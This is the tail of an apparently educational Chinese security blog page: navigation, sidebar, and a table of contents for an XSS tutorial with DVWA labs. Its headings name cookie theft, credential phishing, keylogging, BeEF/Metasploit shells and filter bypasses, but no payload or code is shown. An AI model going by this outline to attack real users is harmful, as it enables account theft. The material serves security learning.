rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/09/08/linuxFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">linuxFTP服务器配置</div></div></a></div><div class="next-post pull-right"><a href="/2025/09/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">文件上传漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2025/09/15/CSRF/" title="CSRF"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-09-15</div><div class="title">CSRF</div></div></a></div><div><a href="/2025/09/15/SSRF/" title="SSRF"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-09-15</div><div class="title">SSRF</div></div></a></div><div><a href="/2025/09/15/xxe/" title="xxe"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-09-15</div><div class="title">xxe</div></div></a></div><div><a href="/2025/09/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" title="文件包含漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-09-15</div><div class="title">文件包含漏洞</div></div></a></div><div><a href="/2025/09/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-09-15</div><div class="title">命令执行</div></div></a></div><div><a href="/2025/09/15/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" title="暴力破解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-09-15</div><div class="title">暴力破解</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./assets/lbxw.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">别看了，去玩会吧</div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(null) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#O-%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.</span> <span class="toc-text">Ø 课程内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#O-%E8%AF%BE%E7%A8%8B%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.</span> <span class="toc-text">Ø 课程目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81XSS%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.</span> <span class="toc-text">一、XSS介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E8%AE%A4%E8%AF%86XSS"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.1 认识XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E4%BB%80%E4%B9%88%E6%98%AFXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.2.</span> <span class="toc-text">1.2 什么是XSS跨站脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-XSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.3.</span> <span class="toc-text">1.3 XSS漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-XSS%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.3.4.</span> <span class="toc-text">1.4 XSS的危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="toc-number">1.3.5.</span> <span class="toc-text">1.5 XSS漏洞的挖掘</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XSS%E5%88%86%E7%B1%BB"><span class="toc-number">1.4.</span> <span class="toc-text">二、XSS分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.4.1.</span> <span class="toc-text">2.1 反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">2.1.1 反射型XSS攻击举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">2.2.1 存储型XSS攻击举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">2.2.2 存储型XSS攻击代码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-DOM%E5%9E%8BXSS"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.3 DOM型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-DOM%E5%9E%8BXSS%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">2.3.1 DOM型XSS介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">2.3.2 攻击方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-3-DOM%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">2.3.3 DOM型XSS攻击举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-4-DOM%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">2.3.4 DOM型XSS攻击代码分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81-XSS%E5%B8%B8%E7%94%A8%E7%9A%84%E8%AF%AD%E5%8F%A5%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">三、****XSS常用的语句及绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-XSS%E5%B8%B8%E7%94%A8%E7%9A%84%E6%B5%8B%E8%AF%95%E8%AF%AD%E5%8F%A5%EF%BC%9A"><span class="toc-number">1.5.1.</span> <span class="toc-text">3.1 XSS常用的测试语句：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%B8%B8%E7%94%A8%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.2.</span> <span class="toc-text">3.2 常用的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-1-JS%E7%BC%96%E7%A0%81"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">3.2.1 JS编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-2-HTML%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">3.2.2 HTML实体编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-3-URL%E7%BC%96%E7%A0%81"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">3.2.3 URL编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81XSS%E4%B9%8BDVWA%E7%BB%83%E4%B9%A0%E5%AE%9E%E6%88%98"><span class="toc-number">1.6.</span> <span class="toc-text">四、XSS之DVWA练习实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-DVWA%E4%B9%8BReflected-XSS-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.6.1.</span> <span class="toc-text">4.1 DVWA之Reflected XSS(反射型XSS)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-1-Low%E7%BA%A7%E5%88%AB"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">4.1.1 Low级别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-2-Medium-%E7%BA%A7%E5%88%AB"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">4.1.2 Medium****级别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-3-High-%E7%BA%A7%E5%88%AB"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">4.1.3 High****级别</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-DVWA%E4%B9%8BStored-XSS-%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.6.2.</span> <span class="toc-text">4.2 DVWA之Stored XSS(存储型XSS)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-1-Low%E7%BA%A7%E5%88%AB"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">4.2.1 Low级别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-2-Medium-%E7%BA%A7%E5%88%AB"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">4.2.2 Medium****级别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-3-High-%E7%BA%A7%E5%88%AB"><span class="toc-number">1.6.2.3.</span> <span class="toc-text">4.2.3 High****级别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-4-impossible%E7%BA%A7%E5%88%AB"><span class="toc-number">1.6.2.4.</span> <span class="toc-text">4.2.4 impossible级别</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-DVWA-%E4%B9%8BDOM-XSS-DOM%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-number">1.6.3.</span> <span class="toc-text">4.3 DVWA****之DOM XSS(DOM型跨站脚本攻击)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-1-Low%E7%BA%A7%E5%88%AB"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">4.3.1 Low级别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-2-Medium%E7%BA%A7%E5%88%AB"><span class="toc-number">1.6.3.2.</span> <span class="toc-text">4.3.2 Medium级别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-2-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88POST%EF%BC%89%E8%8E%B7%E5%8F%96cookie"><span class="toc-number">1.6.3.3.</span> <span class="toc-text">5.2.2 反射型XSS（POST）获取cookie</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81XSS-beef%E7%9A%84%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.7.</span> <span class="toc-text">六、XSS-beef的使用实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E5%8A%AB%E6%8C%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">1.7.1.</span> <span class="toc-text">6.1 劫持客户端浏览器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E5%88%A9%E7%94%A8beef-msf%E6%8B%BF%E7%94%A8%E6%88%B7shell-%E5%9F%BA%E4%BA%8E%E5%AE%A2%E6%88%B7%E7%AB%AFie6"><span class="toc-number">1.7.2.</span> <span class="toc-text">6.2 利用beef+msf拿用户shell(基于客户端ie6 )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E5%88%A9%E7%94%A8beef-msf%E6%8B%BF%E7%94%A8%E6%88%B7shell%EF%BC%88%E5%9F%BA%E4%BA%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BD%BF%E7%94%A8ie789"><span class="toc-number">1.7.3.</span> <span class="toc-text">6.3 利用beef+msf拿用户shell（基于客户端使用ie789 )</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81XSS%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">1.8.</span> <span class="toc-text">七、XSS的防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#O-%E8%AF%BE%E7%A8%8B%E5%B0%8F%E7%BB%93"><span class="toc-number">1.9.</span> <span class="toc-text">Ø 课程小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E7%9B%97%E5%8F%96cookie%E5%AE%9E%E6%88%98"><span class="toc-number">1.10.</span> <span class="toc-text">一、XSS漏洞盗取cookie实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9AXSS%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%90%8E%E5%8F%B0%E4%BD%BF%E7%94%A8%EF%BC%88%E7%9B%97%E5%8F%96cookie%EF%BC%89"><span class="toc-number">1.11.</span> <span class="toc-text">实验一：XSS平台搭建及后台使用（盗取cookie）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-XSS%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%90%8E%E5%8F%B0%E4%BD%BF%E7%94%A8"><span class="toc-number">1.11.1.</span> <span class="toc-text">1. XSS平台搭建及后台使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%9B%97%E5%8F%96cookie"><span class="toc-number">1.11.2.</span> <span class="toc-text">2. 盗取cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BA%8C%EF%BC%9A%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88POST%EF%BC%89%E8%8E%B7%E5%8F%96cookie"><span class="toc-number">1.12.</span> <span class="toc-text">实验二：反射型XSS（POST）获取cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XSS%E9%92%93%E9%B1%BC%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">1.13.</span> <span class="toc-text">二、XSS钓鱼用户名和密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81XSS%E8%8E%B7%E5%8F%96%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.14.</span> <span class="toc-text">三、XSS获取键盘记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81XSS%E7%9B%B2%E6%89%93"><span class="toc-number">1.15.</span> <span class="toc-text">四、XSS盲打</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81XSS%E7%BB%95%E8%BF%87"><span class="toc-number">1.16.</span> <span class="toc-text">五、XSS绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.16.1.</span> <span class="toc-text">5.1 前端代码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.16.2.</span> <span class="toc-text">5.2 后端代码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-1-%E5%A4%A7%E5%B0%8F%E5%86%99%E5%8F%8A%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.16.2.1.</span> <span class="toc-text">5.2.1 大小写及双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-6-XSS%E4%B9%8Bhttponly%E7%BB%95%E8%BF%87"><span class="toc-number">1.16.2.2.</span> <span class="toc-text">5.2.6 XSS之httponly绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-6-1-%E4%BB%80%E4%B9%88%E6%98%AFhttponly"><span class="toc-number">1.16.2.3.</span> <span class="toc-text">5.2.6.1 什么是httponly</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-6-2-%E5%90%84%E8%AF%AD%E8%A8%80%E8%AE%BE%E7%BD%AEcookie%E7%9A%84httponly"><span class="toc-number">1.16.2.4.</span> <span class="toc-text">5.2.6.2 各语言设置cookie的httponly</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-6-3-%E7%BB%95%E8%BF%87httponly"><span class="toc-number">1.16.2.5.</span> <span class="toc-text">5.2.6.3 绕过httponly</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81XSS%E5%B8%B8%E8%A7%84%E9%98%B2%E8%8C%83"><span class="toc-number">1.17.</span> <span class="toc-text">六、XSS常规防范</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/15/xxe/" title="xxe">xxe</a><time datetime="2025-09-15T08:45:22.000Z" title="发表于 2025-09-15 16:45:22">2025-09-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="逻辑漏洞">逻辑漏洞</a><time datetime="2025-09-15T08:42:57.000Z" title="发表于 2025-09-15 16:42:57">2025-09-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/15/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" title="暴力破解">暴力破解</a><time datetime="2025-09-15T08:36:51.000Z" title="发表于 2025-09-15 16:36:51">2025-09-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/15/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/" title="sqlmap的使用">sqlmap的使用</a><time datetime="2025-09-15T08:31:28.000Z" title="发表于 2025-09-15 16:31:28">2025-09-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行">命令执行</a><time datetime="2025-09-15T08:25:44.000Z" title="发表于 2025-09-15 16:25:44">2025-09-15</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title="博客框架为Hexo_v5.4.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2024 - 2025 By <a class="footer-bar-link" href="/" title="蜡笔小王" target="_blank">蜡笔小王</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">5</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="安知鱼的博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="安知鱼的博客"/><span class="back-menu-item-text">安知鱼的博客</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Linux/" style="font-size: 0.88rem;">Linux<sup>1</sup></a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">SQL注入<sup>2</sup></a><a href="/tags/windows/" style="font-size: 